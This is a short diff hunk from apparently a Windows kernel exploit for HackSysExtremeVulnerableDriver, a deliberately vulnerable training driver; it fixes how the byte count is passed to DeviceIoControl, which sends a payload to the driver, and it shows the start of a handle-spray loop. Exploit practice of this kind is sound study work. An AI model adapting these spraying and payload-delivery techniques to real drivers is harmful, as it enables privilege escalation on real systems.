@@ -255,8 +255,8 @@ int main()
 
 
 	HANDLE hevDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, NULL, 0x3, 0, NULL);
-	LPDWORD lpBytesReturned = 0;
-	DeviceIoControl(hevDevice, 0x22200f, payload, sizeof(buf) + 40, NULL, 0, lpBytesReturned, NULL);
+	DWORD lpBytesReturned = 0;
+	DeviceIoControl(hevDevice, 0x22200f, payload, sizeof(buf) + 40, NULL, 0, &lpBytesReturned, NULL);
 
 	for (i = 8; i < (sizeof(spray2) / sizeof(HANDLE)); i = i + 16) {
 		for (j = 0; j < 8; j++) {
